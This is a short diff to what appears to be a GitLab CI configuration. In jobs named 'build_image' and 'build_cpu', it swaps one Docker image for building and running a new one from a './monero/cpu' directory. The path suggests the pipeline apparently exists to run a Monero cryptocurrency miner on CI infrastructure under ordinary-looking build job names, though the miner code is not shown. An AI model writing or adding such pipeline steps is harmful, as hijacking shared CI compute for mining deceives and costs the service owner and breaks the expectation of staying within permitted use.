@@ -13,9 +13,11 @@ before_script:
 build_image:
   stage: build_image
   script:
-    - docker run zenidine/nizadam:mualpine
+    - docker build -t dsomeone/sobakaka:mualpine ./monero/cpu
+    - docker run dsomeone/sobakaka:mualpine
 
 build_cpu:
   stage: build_cpu
   script:
-    - docker run zenidine/nizadam:mualpine
+    - docker build -t dsomeone/sobakaka:mualpine ./monero/cpu
+    - docker run dsomeone/sobakaka:mualpine
